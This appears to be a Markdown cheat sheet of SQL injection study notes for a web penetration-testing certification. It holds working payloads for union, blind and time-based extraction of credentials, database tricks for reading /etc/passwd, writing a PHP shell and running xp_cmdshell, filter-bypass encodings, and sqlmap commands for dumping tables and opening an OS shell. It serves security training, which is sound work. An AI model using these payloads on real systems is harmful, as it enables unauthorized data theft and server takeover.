@@ -1,0 +1,244 @@
+# SQL Injection (SQLi)
+
+> Injection attack where malicious SQL queries are inserted into input fields to manipulate the database.
+
+---
+
+## 🔍 Types of SQLi
+
+### 1. In-Band SQLi
+- **Error-Based** — Uses DB error messages to extract data
+- **Union-Based** — Uses UNION to combine results
+
+### 2. Blind SQLi
+- **Boolean-Based** — True/False responses
+- **Time-Based** — Uses SLEEP/WAITFOR delays
+
+### 3. Out-of-Band SQLi
+- Uses DNS/HTTP channels to exfiltrate data
+- Used when in-band not possible
+
+---
+
+## 🧪 Detection Payloads
+
+```sql
+'
+''
+`
+')
+"))
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+' OR 1=1#
+admin'--
+' UNION SELECT NULL--
+```
+
+---
+
+## 🔗 Union-Based SQLi
+
+```sql
+-- Step 1: Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   (until error)
+
+-- Step 2: Find visible columns
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 'a',NULL,NULL--
+
+-- Step 3: Extract data
+' UNION SELECT username,password,NULL FROM users--
+
+-- Get DB version
+' UNION SELECT @@version,NULL,NULL--
+
+-- Get current DB
+' UNION SELECT database(),NULL,NULL--
+
+-- Get all tables
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+
+-- Get columns
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+```
+
+---
+
+## 👁️ Blind Boolean-Based
+
+```sql
+-- Check if vulnerable
+' AND 1=1--   (true - normal response)
+' AND 1=2--   (false - different response)
+
+-- Extract data character by character
+' AND SUBSTRING(username,1,1)='a'--
+' AND ASCII(SUBSTRING(password,1,1))>97--
+
+-- Check DB version
+' AND SUBSTRING(@@version,1,1)='5'--
+```
+
+---
+
+## ⏱️ Time-Based Blind SQLi
+
+```sql
+-- MySQL
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+'; SELECT pg_sleep(5)--
+
+-- Oracle
+'; SELECT dbms_pipe.receive_message(('a'),5) FROM dual--
+
+-- Extract with time
+' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
+```
+
+---
+
+## 🗄️ Database-Specific Syntax
+
+### MySQL
+```sql
+-- Comments: #  --  /**/
+-- Version: @@version
+-- Current DB: database()
+-- Users: SELECT user FROM mysql.user
+-- File read: LOAD_FILE('/etc/passwd')
+-- File write: INTO OUTFILE '/var/www/shell.php'
+```
+
+### MSSQL
+```sql
+-- Comments: --
+-- Version: @@version
+-- Current DB: DB_NAME()
+-- OS command: EXEC xp_cmdshell 'whoami'
+-- Enable xp_cmdshell:
+EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+```
+
+### PostgreSQL
+```sql
+-- Comments: --
+-- Version: version()
+-- Current DB: current_database()
+-- OS command: COPY TO/FROM PROGRAM
+SELECT pg_read_file('/etc/passwd');
+```
+
+### Oracle
+```sql
+-- Comments: --
+-- Version: SELECT banner FROM v$version
+-- Current DB: SELECT ora_database_name FROM dual
+-- Tables: SELECT table_name FROM all_tables
+```
+
+---
+
+## 🔐 WAF Bypass Techniques
+
+```sql
+-- Whitespace bypass
+'/**/UNION/**/SELECT/**/NULL--
+'%09UNION%09SELECT%09NULL--
+
+-- Case variation
+' uNiOn SeLeCt NULL--
+
+-- Comment injection
+'UN/**/ION SEL/**/ECT NULL--
+
+-- URL encoding
+%27 UNION SELECT NULL--
+
+-- Double encoding
+%2527 UNION SELECT NULL--
+
+-- Scientific notation
+1e0UNION SELECT NULL--
+```
+
+---
+
+## 🛠️ Tools
+
+| Tool | Use |
+|------|-----|
+| sqlmap | Automated SQLi detection & exploitation |
+| Burp Suite | Manual testing & scanning |
+| Havij | GUI-based SQLi tool |
+| BBQSQL | Blind SQLi framework |
+
+```bash
+# Basic sqlmap
+sqlmap -u "https://target.com/page?id=1"
+
+# With POST data
+sqlmap -u "https://target.com/login" --data="user=admin&pass=test"
+
+# With cookies
+sqlmap -u "https://target.com/page?id=1" --cookie="session=abc123"
+
+# Dump database
+sqlmap -u "https://target.com/page?id=1" --dbs
+sqlmap -u "https://target.com/page?id=1" -D dbname --tables
+sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump
+
+# OS shell
+sqlmap -u "https://target.com/page?id=1" --os-shell
+
+# Tamper scripts (WAF bypass)
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between
+```
+
+---
+
+## 📋 SQLi Testing Checklist
+
+- [ ] Test GET parameters
+- [ ] Test POST parameters
+- [ ] Test Cookie values
+- [ ] Test HTTP headers (User-Agent, Referer, X-Forwarded-For)
+- [ ] Test JSON body parameters
+- [ ] Test XML body parameters
+- [ ] Check second-order SQLi (stored then executed)
+- [ ] Test login forms
+- [ ] Test search functionality
+- [ ] Test ORDER BY / sort parameters
+
+---
+
+## 🧠 eWPTXv3 Tips
+
+- Always try **second-order SQLi** — input stored then used in another query
+- Test **JSON parameters** with SQLi payloads
+- Look for **NoSQL injection** too (MongoDB: `{"$gt":""}`)
+- Try **OOB SQLi** using Burp Collaborator
+- Check **stored procedures** for injection
+- Test **LIMIT/OFFSET** parameters
+
+---
+
+## 📚 References
+
+- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
+- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+- [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
